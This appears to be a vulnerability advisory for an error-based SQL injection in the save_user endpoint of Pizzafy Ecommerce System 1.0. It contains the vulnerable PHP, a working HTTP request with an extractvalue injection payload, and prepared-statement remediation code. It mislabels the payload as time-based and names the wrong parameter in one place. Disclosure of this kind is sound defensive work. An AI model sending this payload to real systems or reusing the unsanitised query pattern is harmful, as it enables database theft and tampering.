
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizza/admin/ajax.php?action=save_user`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **select count functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
public function save_user() {

    if(!isset($_SESSION['login_id'])) {
        return 2;
    }    
    extract($_POST);

    if(!empty($id)) {
        $sql = "SELECT * FROM users WHERE (username = '$username') AND id != $id";
    } else {
        $sql = "SELECT * FROM users WHERE username = '$username'";
    }
    
    $check = $this->conn->query($sql);

    if (!$check) {
        return "Erro SQL: " . $this->conn->error . " | Query: " . $sql;
    }
    
    if($check->num_rows > 0) {
        return 3;
    }
    
    $data = " name = '$name' ";
    $data .= ", username = '$username' ";
    $data .= ", type = '$type' ";
    
    if(!empty($password)) {
        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
        $data .= ", password = '$hashed_password' ";
    }
    
    if(empty($id)) {
        $sql_insert = "INSERT INTO users SET $data";
        $save = $this->conn->query($sql_insert);
        if(!$save) {
            return "Erro SQL Insert: " . $this->conn->error . " | Query: " . $sql_insert;
        }
        return 1;
    } else {
        $sql_update = "UPDATE users SET $data WHERE id = $id";
        $save = $this->conn->query($sql_update);
        if(!$save) {
            return "Erro SQL Update: " . $this->conn->error . " | Query: " . $sql_update;
        }
        return 1;
    }
}
```

Below is a **POST** request demonstrating the vulnerability using a **time-based SQL injection payload**:  

```
POST /pizza/admin/ajax.php?action=save_user HTTP/1.1
Host: localhost
Content-Length: 69
sec-ch-ua: 
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizza/admin/index.php?page=users
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=kqdkkqjdujc30ar9iniedtaoeg
Connection: close

username=admin' AND extractvalue(1,concat(0x7e,version())) AND '1'='1
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
username=admin' AND extractvalue(1,concat(0x7e,version())) AND '1'='1
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/sSiqO4P.png)
---

## Remediation
```php
public function save_user() {

    if(!isset($_SESSION['login_id'])) {
        return 2;
    }    
    
     $id = isset($_POST['id']) ? (int)$_POST['id'] : 0;
    $name = isset($_POST['name']) ? $_POST['name'] : '';
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $type = isset($_POST['type']) ? (int)$_POST['type'] : 0;
    $password = isset($_POST['password']) ? $_POST['password'] : '';
 
    if(!empty($id)) {
        $stmt = $this->conn->prepare("SELECT * FROM users WHERE username = ? AND id != ?");
        $stmt->bind_param("si", $username, $id);
    } else {
        $stmt = $this->conn->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->bind_param("s", $username);
    }
    
    $stmt->execute();
    $check = $stmt->get_result();

    if($check->num_rows > 0) {
        return 3;
    }
    
    if(empty($id)) {

        if(!empty($password)) {
            $hashed_password = password_hash($password, PASSWORD_DEFAULT);
            $stmt = $this->conn->prepare("INSERT INTO users (name, username, type, password) VALUES (?, ?, ?, ?)");
            $stmt->bind_param("ssis", $name, $username, $type, $hashed_password);
        } else {
            $stmt = $this->conn->prepare("INSERT INTO users (name, username, type) VALUES (?, ?, ?)");
            $stmt->bind_param("ssi", $name, $username, $type);
        }
    } else {

        if(!empty($password)) {
            $hashed_password = password_hash($password, PASSWORD_DEFAULT);
            $stmt = $this->conn->prepare("UPDATE users SET name = ?, username = ?, type = ?, password = ? WHERE id = ?");
            $stmt->bind_param("ssisi", $name, $username, $type, $hashed_password, $id);
        } else {
            $stmt = $this->conn->prepare("UPDATE users SET name = ?, username = ?, type = ? WHERE id = ?");
            $stmt->bind_param("ssii", $name, $username, $type, $id);
        }
    }
    
    if($stmt->execute()) {
        return 1;
    } else {
        error_log("Erro ao salvar usuário: " . $stmt->error);
        return 0;
    }
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `username` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet